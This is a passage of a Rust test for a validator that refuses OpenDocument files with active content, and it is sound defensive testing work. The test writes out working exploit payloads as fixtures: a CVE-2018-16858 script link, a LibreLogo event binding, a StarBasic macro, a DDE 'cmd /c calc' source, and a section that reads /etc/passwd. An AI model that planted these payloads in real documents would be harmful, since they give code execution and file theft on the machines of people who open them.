    // an event binding that runs a script the office suite ships (the LibreLogo exploits)
    let content = entry(&odt, "content.xml");
    let bound = content.replacen(
        "<office:body>",
        r#"<office:body><script:event-listener xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" script:language="ooo:script" script:event-name="dom:mouseover" xlink:href="vnd.sun.star.script:LibreLogo|LibreLogo.py$run?language=Python&amp;location=share"/>"#,
        1,
    );
    assert!(bound != content);
    refused("notes.odt", &rezip(&odt, &[("content.xml", bound.as_bytes())]), ODF_ACTIVE);
    // review: an OLE object element, the older StarBasic binding, an image loaded from outside
    for inject in [
        r#"<draw:object-ole xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="./Object 1"/>"#,
        r#"<script:event-listener xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" script:event-name="dom:load" script:language="StarBasic" script:macro-name="Tools.Misc.SomeSub"/>"#,
        r#"<draw:image xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="file://x.example/share/a.png"/>"#,
    ] {
        let doc = content.replacen("<office:body>", &format!("<office:body>{inject}"), 1);
        refused("notes.odt", &rezip(&odt, &[("content.xml", doc.as_bytes())]), ODF_ACTIVE);
    }
    // a link that runs a script when clicked (CVE-2018-16858), with no event binding at all
    let link = content.replacen("<office:body>", r#"<office:body><text:a xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="vnd.sun.star.script:../../program/python-core/lib/pydoc.py$tempfilepager(1, calc)?language=Python&amp;location=share">x</text:a>"#, 1);
    refused("notes.odt", &rezip(&odt, &[("content.xml", link.as_bytes())]), ODF_ACTIVE);
    // second review: an image path that climbs out after a first segment, a linked section, DDE; T-45 fix 6
    // review: an image on a Windows file share written with backslashes (`\\host\share\a.png`)
    for inject in [
        r#"<draw:image xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="\\host\share\a.png"/>"#,
        r#"<draw:image xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="./../a.png"/>"#,
        r#"<draw:image xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="Pictures/../../a.png"/>"#,
        r#"<text:section-source xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="file:///etc/passwd"/>"#,
        r#"<office:dde-source xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:dde-application="cmd" office:dde-topic="/c calc" office:dde-item="x"/>"#,
    ] {
        let doc = content.replacen("<office:body>", &format!("<office:body>{inject}"), 1);
        refused("notes.odt", &rezip(&odt, &[("content.xml", doc.as_bytes())]), ODF_ACTIVE);
    }
    // a binary OLE object stored as `Object 1`, even with the manifest silent about it
    refused("notes.odt", &rezip(&odt, &[("Object 1", b"\xD0\xCF\x11\xE0")]), ODF_ACTIVE);
    // a picture inside the file is fine
    let picture = content.replacen("<office:body>", r#"<office:body><draw:image xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="Pictures/a.png"/>"#, 1);
    ok("notes.odt", &rezip(&odt, &[("content.xml", picture.as_bytes())]));
    // the mimetype entry must come first, stored
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    w.start_file("mimetype", SimpleFileOptions::default().compression_method(CompressionMethod::Deflated)).unwrap();
    w.write_all(b"application/vnd.oasis.opendocument.text").unwrap();
    refused("notes.odt", &w.finish().unwrap().into_inner(), "");
}
